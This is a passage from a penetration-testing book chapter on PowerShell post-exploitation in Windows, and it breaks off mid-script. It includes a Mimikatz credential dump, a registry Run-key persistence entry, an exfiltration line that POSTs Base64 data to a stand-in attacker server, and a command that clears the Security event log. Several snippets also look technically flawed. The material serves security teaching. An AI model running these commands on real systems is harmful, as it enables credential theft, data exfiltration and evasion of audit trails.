<html><head></head><body>
<div id="_idContainer063">
<h1 class="chapter-number" id="_idParaDest-480"><a id="_idTextAnchor478"/><span class="koboSpan" id="kobo.1.1">15</span></h1>
<h1 id="_idParaDest-481"><a id="_idTextAnchor479"/><span class="koboSpan" id="kobo.2.1">Post-Exploitation in Microsoft Windows</span></h1>
<p><span class="koboSpan" id="kobo.3.1">In this chapter, we delve into the powerful realm of post-exploitation using PowerShell in the Microsoft Windows environment. </span><span class="koboSpan" id="kobo.3.2">Post-exploitation is a critical phase where adversaries aim to maintain control, escalate privileges, and extract valuable information after breaching a system. </span><span class="koboSpan" id="kobo.3.3">Harnessing the robust capabilities of PowerShell, we explore advanced techniques for navigating Windows networks, manipulating permissions, and concealing activities. </span><span class="koboSpan" id="kobo.3.4">From privilege escalation and lateral movement to data exfiltration and covering tracks, PowerShell serves as a versatile toolset for both defenders and attackers. </span><span class="koboSpan" id="kobo.3.5">Join us as we unravel the intricacies of post-exploitation, demonstrating how PowerShell scripts can be strategically employed to simulate real-world threats and enhance our understanding of Windows security landscapes. </span><span class="koboSpan" id="kobo.3.6">Through detailed examples and practical insights, this chapter equips you with the knowledge to assess, defend, and strategically navigate the post-exploitation phase in Microsoft </span><span class="No-Break"><span class="koboSpan" id="kobo.4.1">Windows environments.</span></span></p>
<p><span class="koboSpan" id="kobo.5.1">The following are the main topics to be covered in </span><span class="No-Break"><span class="koboSpan" id="kobo.6.1">this chapter:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.7.1">The role of post-exploitation in Microsoft Windows on a </span><span class="No-Break"><span class="koboSpan" id="kobo.8.1">penetration test</span></span></li>
<li><span class="koboSpan" id="kobo.9.1">Post-exploitation on </span><span class="No-Break"><span class="koboSpan" id="kobo.10.1">Microsoft Windows</span></span></li>
<li><span class="koboSpan" id="kobo.11.1">Profiling a user with PowerShell on </span><span class="No-Break"><span class="koboSpan" id="kobo.12.1">Microsoft Windows</span></span></li>
<li><span class="koboSpan" id="kobo.13.1">File permissions in </span><span class="No-Break"><span class="koboSpan" id="kobo.14.1">Microsoft Windows</span></span></li>
<li><span class="koboSpan" id="kobo.15.1">Using PowerShell for privilege escalation on </span><span class="No-Break"><span class="koboSpan" id="kobo.16.1">Microsoft Windows</span></span></li>
</ul>
<h1 id="_idParaDest-482"><a id="_idTextAnchor480"/><span class="koboSpan" id="kobo.17.1">The role of post-exploitation in Microsoft Windows on a penetration test</span></h1>
<p><span class="koboSpan" id="kobo.18.1">Post-exploitation is a critical phase</span><a id="_idIndexMarker951"/><span class="koboSpan" id="kobo.19.1"> in a penetration</span><a id="_idIndexMarker952"/><span class="koboSpan" id="kobo.20.1"> test, especially when targeting Microsoft Windows environments. </span><span class="koboSpan" id="kobo.20.2">This phase occurs after an attacker has successfully breached a system or network, gaining unauthorized access. </span><span class="koboSpan" id="kobo.20.3">The primary objective during post-exploitation is to maintain control, escalate privileges, and gather valuable information without triggering </span><span class="No-Break"><span class="koboSpan" id="kobo.21.1">detection mechanisms.</span></span></p>
<p><span class="koboSpan" id="kobo.22.1">One crucial aspect of post-exploitation on Microsoft Windows is understanding the operating system’s architecture and security mechanisms. </span><span class="koboSpan" id="kobo.22.2">Windows environments often have multiple interconnected systems, making lateral movement a key focus. </span><span class="koboSpan" id="kobo.22.3">Attackers aim to traverse the network, escalating privileges to gain greater control </span><span class="No-Break"><span class="koboSpan" id="kobo.23.1">over resources.</span></span></p>
<p><span class="koboSpan" id="kobo.24.1">Privilege escalation is a common goal during post-exploitation. </span><span class="koboSpan" id="kobo.24.2">Windows systems typically operate with different user accounts, each with varying permissions. </span><span class="koboSpan" id="kobo.24.3">Exploiting vulnerabilities to elevate privileges allows attackers to access sensitive data, install malicious software, or manipulate system configurations. </span><span class="koboSpan" id="kobo.24.4">Tools such as Mimikatz frequently extract and leverage credentials stored in memory, facilitating </span><span class="No-Break"><span class="koboSpan" id="kobo.25.1">privilege escalation.</span></span></p>
<p><span class="koboSpan" id="kobo.26.1">Maintaining persistence is another crucial aspect of post-exploitation. </span><span class="koboSpan" id="kobo.26.2">Attackers seek to ensure continued access to compromised systems even after initial exploitation. </span><span class="koboSpan" id="kobo.26.3">Techniques such as backdoors, scheduled tasks, or registry modifications are commonly employed to establish persistence. </span><span class="koboSpan" id="kobo.26.4">This ensures that even if the initial point of entry is discovered and patched, the attacker can still </span><span class="No-Break"><span class="koboSpan" id="kobo.27.1">regain access.</span></span></p>
<p><span class="koboSpan" id="kobo.28.1">Data exfiltration</span><a id="_idIndexMarker953"/><span class="koboSpan" id="kobo.29.1"> is a significant concern</span><a id="_idIndexMarker954"/><span class="koboSpan" id="kobo.30.1"> during post-exploitation. </span><span class="koboSpan" id="kobo.30.2">Once inside a network, attackers may target sensitive information such as intellectual property, customer data, or login credentials. </span><span class="koboSpan" id="kobo.30.3">Various tools and techniques, including covert channels and encrypted communication, are utilized to exfiltrate data without </span><span class="No-Break"><span class="koboSpan" id="kobo.31.1">raising suspicion.</span></span></p>
<p><span class="koboSpan" id="kobo.32.1">During post-exploitation, security professionals must emulate real-world adversaries to assess the effectiveness of defenses and incident response capabilities. </span><span class="koboSpan" id="kobo.32.2">Red teamers often use tools such as Cobalt Strike or Metasploit to simulate advanced persistent threats, testing the organization’s ability to detect and respond to </span><span class="No-Break"><span class="koboSpan" id="kobo.33.1">sophisticated attacks.</span></span></p>
<p><span class="koboSpan" id="kobo.34.1">Post-exploitation also involves thorough reconnaissance. </span><span class="koboSpan" id="kobo.34.2">Attackers aim to gather intelligence about the network, its architecture, and the roles of different systems and users. </span><span class="koboSpan" id="kobo.34.3">This information helps in making informed decisions about further exploitation and </span><span class="No-Break"><span class="koboSpan" id="kobo.35.1">lateral movement.</span></span></p>
<p><span class="koboSpan" id="kobo.36.1">In summary, post-exploitation is a critical phase in a penetration test focused on Microsoft Windows environments. </span><span class="koboSpan" id="kobo.36.2">It involves privilege escalation, persistence, data exfiltration, and reconnaissance to simulate real-world threats, providing valuable insights into an organization’s security</span><a id="_idIndexMarker955"/><span class="koboSpan" id="kobo.37.1"> posture and identifying </span><a id="_idIndexMarker956"/><span class="koboSpan" id="kobo.38.1">areas </span><span class="No-Break"><span class="koboSpan" id="kobo.39.1">for improvement.</span></span></p>
<h1 id="_idParaDest-483"><a id="_idTextAnchor481"/><span class="koboSpan" id="kobo.40.1">Post-exploitation on Microsoft Windows</span></h1>
<p><span class="koboSpan" id="kobo.41.1">PowerShell, a powerful scripting</span><a id="_idIndexMarker957"/><span class="koboSpan" id="kobo.42.1"> language and shell developed by Microsoft, is often leveraged during post-exploitation activities on the Microsoft Windows platform. </span><span class="koboSpan" id="kobo.42.2">Its flexibility, integration with Windows components, and ability to execute commands and scripts make it a preferred choice </span><span class="No-Break"><span class="koboSpan" id="kobo.43.1">for attackers.</span></span></p>
<p><span class="koboSpan" id="kobo.44.1">There are also frameworks that support post-exploitation. </span><span class="koboSpan" id="kobo.44.2">PowerShell Empire is a post-exploitation framework that provides a range of tools and modules for performing post-exploitation activities on </span><span class="No-Break"><span class="koboSpan" id="kobo.45.1">Windows systems.</span></span></p>
<p><span class="koboSpan" id="kobo.46.1">The following are detailed examples of how PowerShell can be used for various </span><span class="No-Break"><span class="koboSpan" id="kobo.47.1">post-exploitation tasks.</span></span></p>
<h2 id="_idParaDest-484"><a id="_idTextAnchor482"/><span class="koboSpan" id="kobo.48.1">Privilege escalation</span></h2>
<p><span class="koboSpan" id="kobo.49.1">PowerShell can be used to check for privilege escalation </span><a id="_idIndexMarker958"/><span class="koboSpan" id="kobo.50.1">opportunities. </span><span class="koboSpan" id="kobo.50.2">For instance, the following PowerShell command checks for the current </span><span class="No-Break"><span class="koboSpan" id="kobo.51.1">user’s privileges:</span></span></p>
<pre class="console"><span class="koboSpan" id="kobo.52.1">
whoami /all</span></pre> <p><span class="koboSpan" id="kobo.53.1">This command reveals information about the current user, including their group memberships </span><span class="No-Break"><span class="koboSpan" id="kobo.54.1">and privileges.</span></span></p>
<h2 id="_idParaDest-485"><a id="_idTextAnchor483"/><span class="koboSpan" id="kobo.55.1">Credential dumping</span></h2>
<p><span class="koboSpan" id="kobo.56.1">PowerShell is commonly used to dump credentials</span><a id="_idIndexMarker959"/><span class="koboSpan" id="kobo.57.1"> from memory. </span><span class="koboSpan" id="kobo.57.2">The following example demonstrates the use of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.58.1">Mimikatz</span></strong><span class="koboSpan" id="kobo.59.1"> PowerShell module, which is a popular tool for </span><span class="No-Break"><span class="koboSpan" id="kobo.60.1">credential extraction:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.61.1">
# Load Mimikatz module
Import-Module .\mimikatz.ps1
# Run Mimikatz command to dump credentials
Invoke-Mimikatz -DumpCreds</span></pre> <p><span class="koboSpan" id="kobo.62.1">This script imports the </span><strong class="source-inline"><span class="koboSpan" id="kobo.63.1">Mimikatz</span></strong><span class="koboSpan" id="kobo.64.1"> module and executes the </span><strong class="source-inline"><span class="koboSpan" id="kobo.65.1">Invoke-Mimikatz</span></strong><span class="koboSpan" id="kobo.66.1"> cmdlet to dump credentials</span><a id="_idIndexMarker960"/> <span class="No-Break"><span class="koboSpan" id="kobo.67.1">from memory.</span></span></p>
<h2 id="_idParaDest-486"><a id="_idTextAnchor484"/><span class="koboSpan" id="kobo.68.1">Persistence</span></h2>
<p><span class="koboSpan" id="kobo.69.1">PowerShell can be employed to establish</span><a id="_idIndexMarker961"/><span class="koboSpan" id="kobo.70.1"> persistence on a compromised system. </span><span class="koboSpan" id="kobo.70.2">For example, the following script adds a registry entry to execute a PowerShell script at </span><span class="No-Break"><span class="koboSpan" id="kobo.71.1">system startup:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.72.1">
# Create a registry key for persistence
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyScript" -Value "powershell.exe -ExecutionPolicy Bypass -File C:\Path\To\MyScript.ps1"</span></pre> <p><span class="koboSpan" id="kobo.73.1">This script creates a registry key that ensures the execution of a PowerShell script every time the user </span><span class="No-Break"><span class="koboSpan" id="kobo.74.1">logs in.</span></span></p>
<h2 id="_idParaDest-487"><a id="_idTextAnchor485"/><span class="koboSpan" id="kobo.75.1">Lateral movement</span></h2>
<p><span class="koboSpan" id="kobo.76.1">PowerShell’s ability</span><a id="_idIndexMarker962"/><span class="koboSpan" id="kobo.77.1"> to execute commands remotely makes it valuable for lateral movement within a network. </span><span class="koboSpan" id="kobo.77.2">The following example uses PowerShell remoting to execute a command on a </span><span class="No-Break"><span class="koboSpan" id="kobo.78.1">remote machine:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.79.1">
# Enable PowerShell remoting on the target machine
Enable-PSRemoting -Force
# Run a command on the remote machine
Invoke-Command -ComputerName TargetMachine -ScriptBlock { Get-Process }</span></pre> <p><span class="koboSpan" id="kobo.80.1">In this example, PowerShell remoting is enabled on the target machine, and then a command (</span><strong class="source-inline"><span class="koboSpan" id="kobo.81.1">Get-Process</span></strong><span class="koboSpan" id="kobo.82.1">) is executed remotely. </span><span class="koboSpan" id="kobo.82.2">It should be noted that many cmdlets support the </span><strong class="source-inline"><span class="koboSpan" id="kobo.83.1">-ComputeName</span></strong><span class="koboSpan" id="kobo.84.1"> parameter. </span><span class="koboSpan" id="kobo.84.2">This allows</span><a id="_idIndexMarker963"/><span class="koboSpan" id="kobo.85.1"> for the remote execution of the specific command on the </span><span class="No-Break"><span class="koboSpan" id="kobo.86.1">target system.</span></span></p>
<h2 id="_idParaDest-488"><a id="_idTextAnchor486"/><span class="koboSpan" id="kobo.87.1">Data exfiltration</span></h2>
<p><span class="koboSpan" id="kobo.88.1">PowerShell can be employed for data exfiltration</span><a id="_idIndexMarker964"/><span class="koboSpan" id="kobo.89.1"> using various techniques. </span><span class="koboSpan" id="kobo.89.2">One standard method is to encode data into Base64 and send it over the network. </span><span class="koboSpan" id="kobo.89.3">The following script </span><span class="No-Break"><span class="koboSpan" id="kobo.90.1">demonstrates this:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.91.1">
# Encode and send data to a remote server
$data = "SensitiveData"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest -Uri "http s://attac ker-server.com/upload.php" -Method POST -Body $encodedData</span></pre> <p><span class="koboSpan" id="kobo.92.1">This script encodes the </span><strong class="source-inline"><span class="koboSpan" id="kobo.93.1">SensitiveData</span></strong><span class="koboSpan" id="kobo.94.1"> string into Base64 and sends it to an </span><span class="No-Break"><span class="koboSpan" id="kobo.95.1">attacker-controlled server.</span></span></p>
<h2 id="_idParaDest-489"><a id="_idTextAnchor487"/><span class="koboSpan" id="kobo.96.1">Covering tracks</span></h2>
<p><span class="koboSpan" id="kobo.97.1">PowerShell can also cover </span><a id="_idIndexMarker965"/><span class="koboSpan" id="kobo.98.1">its tracks by deleting logs or modifying event entries. </span><span class="koboSpan" id="kobo.98.2">The following example demonstrates the removal of </span><span class="No-Break"><span class="koboSpan" id="kobo.99.1">event logs:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.100.1">
# Clear Windows event logs
Get-EventLog -LogName "Security" | ForEach-Object { Clear-EventLog -LogName $_.Log -Entry $_.Index -Force }</span></pre> <p><span class="koboSpan" id="kobo.101.1">This script clears the security event log, removing traces </span><span class="No-Break"><span class="koboSpan" id="kobo.102.1">of activities.</span></span></p>
<p><span class="koboSpan" id="kobo.103.1">In summary, PowerShell is a versatile tool for post-exploitation on the Microsoft Windows platform. </span><span class="koboSpan" id="kobo.103.2">It enables attackers to escalate privileges, dump credentials, establish persistence, move laterally, exfiltrate data, and cover tracks. </span><span class="koboSpan" id="kobo.103.3">Defenders should be vigilant in monitoring PowerShell activities and implementing security measures to mitigate the risks associated</span><a id="_idIndexMarker966"/><span class="koboSpan" id="kobo.104.1"> with </span><span class="No-Break"><span class="koboSpan" id="kobo.105.1">its misuse.</span></span></p>
<h1 id="_idParaDest-490"><a id="_idTextAnchor488"/><span class="koboSpan" id="kobo.106.1">Profiling a user with PowerShell on Microsoft Windows</span></h1>
<p><span class="koboSpan" id="kobo.107.1">Profiling a user with PowerShell</span><a id="_idIndexMarker967"/><span class="koboSpan" id="kobo.108.1"> on Microsoft Windows involves gathering detailed information about the user’s activities, permissions, and system interactions. </span><span class="koboSpan" id="kobo.108.2">This process is crucial for security professionals performing penetration tests and attackers seeking to exploit vulnerabilities. </span><span class="koboSpan" id="kobo.108.3">The following are examples of how PowerShell can be used to profile a user on a </span><span class="No-Break"><span class="koboSpan" id="kobo.109.1">Windows system.</span></span></p>
<h2 id="_idParaDest-491"><a id="_idTextAnchor489"/><span class="koboSpan" id="kobo.110.1">User information</span></h2>
<p><span class="koboSpan" id="kobo.111.1">PowerShell can retrieve detailed</span><a id="_idIndexMarker968"/><span class="koboSpan" id="kobo.112.1"> information about a user, including their account properties and group memberships. </span><span class="koboSpan" id="kobo.112.2">The following example demonstrates how to gather </span><span class="No-Break"><span class="koboSpan" id="kobo.113.1">user information:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.114.1">
# Get information about the current user
Get-LocalUser -Name $env:USERNAME
# Get group memberships of the current user
Get-LocalGroupMember -Group "Users"</span></pre> <p><span class="koboSpan" id="kobo.115.1">This script retrieves information about the currently logged-in user, including properties such as username, full name, and </span><span class="No-Break"><span class="koboSpan" id="kobo.116.1">group memberships.</span></span></p>
<h2 id="_idParaDest-492"><a id="_idTextAnchor490"/><span class="koboSpan" id="kobo.117.1">Running processes</span></h2>
<p><span class="koboSpan" id="kobo.118.1">Profiling involves understanding the processes </span><a id="_idIndexMarker969"/><span class="koboSpan" id="kobo.119.1">a user is running. </span><span class="koboSpan" id="kobo.119.2">PowerShell allows the retrieval of running processes and </span><span class="No-Break"><span class="koboSpan" id="kobo.120.1">associated details:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.121.1">
# Get a list of running processes for the current user
Get-Process -IncludeUserName</span></pre> <p><span class="koboSpan" id="kobo.122.1">This command provides</span><a id="_idIndexMarker970"/><span class="koboSpan" id="kobo.123.1"> information about processes, including the username associated with </span><span class="No-Break"><span class="koboSpan" id="kobo.124.1">each process.</span></span></p>
<h2 id="_idParaDest-493"><a id="_idTextAnchor491"/><span class="koboSpan" id="kobo.125.1">Network connections</span></h2>
<p><span class="koboSpan" id="kobo.126.1">Profiling includes examining network connections</span><a id="_idIndexMarker971"/><span class="koboSpan" id="kobo.127.1"> established by a user. </span><span class="koboSpan" id="kobo.127.2">PowerShell can be used to retrieve information about active network connections about processes owners by a </span><span class="No-Break"><span class="koboSpan" id="kobo.128.1">specific user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.129.1">
# Get active network connections for the current user
Get-NetTCPConnection -OwningProcess (Get-Process -IncludeUserName | Where-Object { $_.UserName -eq $env:USERNAME }).Id</span></pre> <p><span class="koboSpan" id="kobo.130.1">This script identifies active network connections associated with processes owned by the </span><span class="No-Break"><span class="koboSpan" id="kobo.131.1">current user.</span></span></p>
<h2 id="_idParaDest-494"><a id="_idTextAnchor492"/><span class="koboSpan" id="kobo.132.1">File and directory access</span></h2>
<p><span class="koboSpan" id="kobo.133.1">Profiling involves </span><a id="_idIndexMarker972"/><span class="koboSpan" id="kobo.134.1">understanding a user’s file and directory access. </span><span class="koboSpan" id="kobo.134.2">PowerShell can be used to list files and directories a user has </span><span class="No-Break"><span class="koboSpan" id="kobo.135.1">access to:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.136.1">
# List files/directories in the user's home directory
Get-ChildItem -Path $env:USERPROFILE</span></pre> <p><span class="koboSpan" id="kobo.137.1">This command lists files and directories in the user’s </span><span class="No-Break"><span class="koboSpan" id="kobo.138.1">home directory.</span></span></p>
<h2 id="_idParaDest-495"><a id="_idTextAnchor493"/><span class="koboSpan" id="kobo.139.1">Installed software</span></h2>
<p><span class="koboSpan" id="kobo.140.1">PowerShell allows querying installed</span><a id="_idIndexMarker973"/><span class="koboSpan" id="kobo.141.1"> software on a system, providing insights into the tools </span><span class="No-Break"><span class="koboSpan" id="kobo.142.1">and applications:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.143.1">
# Get a list of installed software for the current user
Get-WmiObject -Query "SELECT * FROM Win32_Product WHERE Vendor = '$env:USERNAME'"</span></pre> <p><span class="koboSpan" id="kobo.144.1">This command retrieves a list of installed software associated with the </span><span class="No-Break"><span class="koboSpan" id="kobo.145.1">current user.</span></span></p>
<h2 id="_idParaDest-496"><a id="_idTextAnchor494"/><span class="koboSpan" id="kobo.146.1">Recent activities</span></h2>
<p><span class="koboSpan" id="kobo.147.1">Profiling involves understanding</span><a id="_idIndexMarker974"/><span class="koboSpan" id="kobo.148.1"> a user’s recent activities. </span><span class="koboSpan" id="kobo.148.2">PowerShell can query event logs to gather information about when a user logs in, when system changes occur, and other relevant events. </span><span class="koboSpan" id="kobo.148.3">In the following snippet, we will focus on when a user logs in and </span><span class="No-Break"><span class="koboSpan" id="kobo.149.1">logs out:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.150.1">
# Get recent security events for the current user
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624 or EventID=4634) and EventData[Data[@Name='TargetUserName']='$env:USERNAME']]]" -MaxEvents 10</span></pre> <p><span class="koboSpan" id="kobo.151.1">This script retrieves recent security events related to the current user, such as successful logins </span><span class="No-Break"><span class="koboSpan" id="kobo.152.1">and logouts.</span></span></p>
<p><span class="koboSpan" id="kobo.153.1">In summary, profiling a user with PowerShell on Microsoft Windows involves using various cmdlets and commands to gather information about the user’s account, running processes, network connections, file access, installed software, and recent activities. </span><span class="koboSpan" id="kobo.153.2">This comprehensive approach helps security professionals assess user behaviors and identify potential </span><span class="No-Break"><span class="koboSpan" id="kobo.154.1">security risks.</span></span></p>
<h1 id="_idParaDest-497"><a id="_idTextAnchor495"/><span class="koboSpan" id="kobo.155.1">File permissions in Microsoft Windows</span></h1>
<p><span class="koboSpan" id="kobo.156.1">File permissions in Microsoft Windows</span><a id="_idIndexMarker975"/><span class="koboSpan" id="kobo.157.1"> play a crucial role in controlling access to files and folders, ensuring data security and integrity. </span><span class="koboSpan" id="kobo.157.2">Understanding how to manage and manipulate file permissions is essential for system administrators, security professionals, and users. </span><span class="koboSpan" id="kobo.157.3">The following sections are detailed examples illustrating how file permissions work </span><span class="No-Break"><span class="koboSpan" id="kobo.158.1">in Windows.</span></span></p>
<h2 id="_idParaDest-498"><a id="_idTextAnchor496"/><span class="koboSpan" id="kobo.159.1">Viewing file permissions</span></h2>
<p><span class="koboSpan" id="kobo.160.1">PowerShell can</span><a id="_idIndexMarker976"/><span class="koboSpan" id="kobo.161.1"> view the existing file permissions on a file or folder. </span><span class="koboSpan" id="kobo.161.2">The following example shows how to retrieve the current permissions for </span><span class="No-Break"><span class="koboSpan" id="kobo.162.1">a file:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.163.1">
# Get file permissions for a specific file
Get-Acl -Path "C:\Path\To\File.txt" | Format-List</span></pre> <p><span class="koboSpan" id="kobo.164.1">This script uses the </span><strong class="source-inline"><span class="koboSpan" id="kobo.165.1">Get-Acl</span></strong><span class="koboSpan" id="kobo.166.1"> cmdlet to retrieve the </span><strong class="bold"><span class="koboSpan" id="kobo.167.1">Access Control List</span></strong><span class="koboSpan" id="kobo.168.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.169.1">ACL</span></strong><span class="koboSpan" id="kobo.170.1">) for the specified file and then formats</span><a id="_idIndexMarker977"/><span class="koboSpan" id="kobo.171.1"> the output for </span><span class="No-Break"><span class="koboSpan" id="kobo.172.1">better readability.</span></span></p>
<h2 id="_idParaDest-499"><a id="_idTextAnchor497"/><span class="koboSpan" id="kobo.173.1">Granting file permissions</span></h2>
<p><span class="koboSpan" id="kobo.174.1">PowerShell enables users</span><a id="_idIndexMarker978"/><span class="koboSpan" id="kobo.175.1"> to grant specific permissions to users or groups. </span><span class="koboSpan" id="kobo.175.2">The following example demonstrates how to grant read and execute permissions to a </span><span class="No-Break"><span class="koboSpan" id="kobo.176.1">specific user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.177.1">
# Grant read and execute permissions to a user
$user = "andrewblyth"
$file = "C:\Path\To\File.txt"
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "ReadAndExecute", "Allow")
(Get-Acl -Path $file).AddAccessRule($permission) | Set-Acl -Path $file</span></pre> <p><span class="koboSpan" id="kobo.178.1">This script creates a new access rule, specifying the user, the type of permission (</span><strong class="source-inline"><span class="koboSpan" id="kobo.179.1">ReadAndExecute</span></strong><span class="koboSpan" id="kobo.180.1">), and whether to allow or deny the permission. </span><span class="koboSpan" id="kobo.180.2">The rule is then added to the </span><span class="No-Break"><span class="koboSpan" id="kobo.181.1">file’s ACL.</span></span></p>
<h2 id="_idParaDest-500"><a id="_idTextAnchor498"/><span class="koboSpan" id="kobo.182.1">Modifying file permissions</span></h2>
<p><span class="koboSpan" id="kobo.183.1">Existing file permissions</span><a id="_idIndexMarker979"/><span class="koboSpan" id="kobo.184.1"> can be modified using PowerShell. </span><span class="koboSpan" id="kobo.184.2">The following example shows how to add write permissions to an </span><span class="No-Break"><span class="koboSpan" id="kobo.185.1">existing user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.186.1">
# Add write permissions to an existing user
$user = "AndrewBlyth"
$file = "C:\Path\To\File.txt"
$acl = Get-Acl -Path $file
$acl.SetAccessRuleProtection($false, $false)
$permission = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Write", "Allow")
$acl.AddAccessRule($permission) | Set-Acl -Path $file</span></pre> <p><span class="koboSpan" id="kobo.187.1">This script retrieves the current ACL, disables</span><a id="_idIndexMarker980"/><span class="koboSpan" id="kobo.188.1"> inheritance and protection, adds a new access rule for write permission, and then applies the modified ACL to </span><span class="No-Break"><span class="koboSpan" id="kobo.189.1">the file.</span></span></p>
<h2 id="_idParaDest-501"><a id="_idTextAnchor499"/><span class="koboSpan" id="kobo.190.1">Revoking file permissions</span></h2>
<p><span class="koboSpan" id="kobo.191.1">PowerShell can be used</span><a id="_idIndexMarker981"/><span class="koboSpan" id="kobo.192.1"> to revoke or remove file permissions. </span><span class="koboSpan" id="kobo.192.2">The following example demonstrates how to remove read permissions from a </span><span class="No-Break"><span class="koboSpan" id="kobo.193.1">specific user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.194.1">
# Remove read permissions from a user
$user = "AndrewBlyth"
$file = "C:\Path\To\File.txt"
$acl = Get-Acl -Path $file
$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq "Read" }
$acl.RemoveAccessRule($rule) | Set-Acl -Path $file</span></pre> <p><span class="koboSpan" id="kobo.195.1">In this script, the existing access rule for the specified user and read permission is identified and removed from </span><span class="No-Break"><span class="koboSpan" id="kobo.196.1">the ACL.</span></span></p>
<p><span class="koboSpan" id="kobo.197.1">Understanding and effectively</span><a id="_idIndexMarker982"/><span class="koboSpan" id="kobo.198.1"> managing file permissions in Windows is critical for maintaining a secure and organized filesystem. </span><span class="koboSpan" id="kobo.198.2">PowerShell provides a powerful and scriptable interface for performing these </span><span class="No-Break"><span class="koboSpan" id="kobo.199.1">tasks efficiently.</span></span></p>
<h1 id="_idParaDest-502"><a id="_idTextAnchor500"/><span class="koboSpan" id="kobo.200.1">Using PowerShell for privilege escalation on Microsoft Windows</span></h1>
<p><span class="koboSpan" id="kobo.201.1">Privilege escalation</span><a id="_idIndexMarker983"/><span class="koboSpan" id="kobo.202.1"> is a critical aspect of penetration testing and security assessment. </span><span class="koboSpan" id="kobo.202.2">PowerShell, a powerful scripting language in the Windows environment, can be used for various privilege escalation techniques. </span><span class="koboSpan" id="kobo.202.3">The following are detailed examples illustrating how PowerShell can be employed for privilege escalation on </span><span class="No-Break"><span class="koboSpan" id="kobo.203.1">Microsoft Windows.</span></span></p>
<h2 id="_idParaDest-503"><a id="_idTextAnchor501"/><span class="koboSpan" id="kobo.204.1">Checking the current user’s privileges</span></h2>
<p><span class="koboSpan" id="kobo.205.1">Before attempting privilege </span><a id="_idIndexMarker984"/><span class="koboSpan" id="kobo.206.1">escalation, it’s crucial to understand the current user’s privileges. </span><span class="koboSpan" id="kobo.206.2">PowerShell can be used to retrieve detailed information about the </span><span class="No-Break"><span class="koboSpan" id="kobo.207.1">current user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.208.1">
# Check current user's privileges
whoami /all</span></pre> <p><span class="koboSpan" id="kobo.209.1">This command provides extensive information about the current user, including group memberships </span><span class="No-Break"><span class="koboSpan" id="kobo.210.1">and privileges.</span></span></p>
<h2 id="_idParaDest-504"><a id="_idTextAnchor502"/><span class="koboSpan" id="kobo.211.1">Enumerating local administrators</span></h2>
<p><span class="koboSpan" id="kobo.212.1">Identifying local administrators</span><a id="_idIndexMarker985"/><span class="koboSpan" id="kobo.213.1"> is a common step in privilege escalation. </span><span class="koboSpan" id="kobo.213.2">PowerShell allows for the enumeration of </span><span class="No-Break"><span class="koboSpan" id="kobo.214.1">local administrators:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.215.1">
# Get members of the Administrators group
Get-LocalGroupMember -Group "Administrators"</span></pre> <p><span class="koboSpan" id="kobo.216.1">This command lists the members of the </span><strong class="source-inline"><span class="koboSpan" id="kobo.217.1">Administrators</span></strong><span class="koboSpan" id="kobo.218.1"> group, helping identify users with </span><span class="No-Break"><span class="koboSpan" id="kobo.219.1">elevated privileges.</span></span></p>
<h2 id="_idParaDest-505"><a id="_idTextAnchor503"/><span class="koboSpan" id="kobo.220.1">Exploiting unquoted service paths</span></h2>
<p><span class="koboSpan" id="kobo.221.1">Some services on Windows </span><a id="_idIndexMarker986"/><span class="koboSpan" id="kobo.222.1">may have unquoted paths, allowing an attacker to manipulate the service execution path and potentially escalate privileges. </span><span class="koboSpan" id="kobo.222.2">PowerShell can be used to identify </span><span class="No-Break"><span class="koboSpan" id="kobo.223.1">such services:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.224.1">
# Check for unquoted service paths
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*\\*"' -and $_.StartMode -ne 'Disabled' }</span></pre> <p><span class="koboSpan" id="kobo.225.1">This script identifies services</span><a id="_idIndexMarker987"/><span class="koboSpan" id="kobo.226.1"> with unquoted paths, which could be exploited for </span><span class="No-Break"><span class="koboSpan" id="kobo.227.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-506"><a id="_idTextAnchor504"/><span class="koboSpan" id="kobo.228.1">Exploiting insecure service permissions</span></h2>
<p><span class="koboSpan" id="kobo.229.1">In some cases, service configurations</span><a id="_idIndexMarker988"/><span class="koboSpan" id="kobo.230.1"> may have insecure permissions, allowing modification by non-privileged users. </span><span class="koboSpan" id="kobo.230.2">PowerShell can be used to identify and exploit </span><span class="No-Break"><span class="koboSpan" id="kobo.231.1">such misconfigurations:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.232.1">
# Identify services with weak permissions
Get-Service | ForEach-Object {
    $service = $_
    $acl = (Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\$($service.ServiceName)")
    if ($acl.Access | Where-Object { $_.IdentityReference -eq "Users" -and $_.FileSystemRights -match "Write" }) {
        # Exploit weak permissions (replace with your payload)
        Write-Host "Service $($service.DisplayName) has weak permissions. </span><span class="koboSpan" id="kobo.232.2">Exploiting..."
</span><span class="koboSpan" id="kobo.232.3">    }
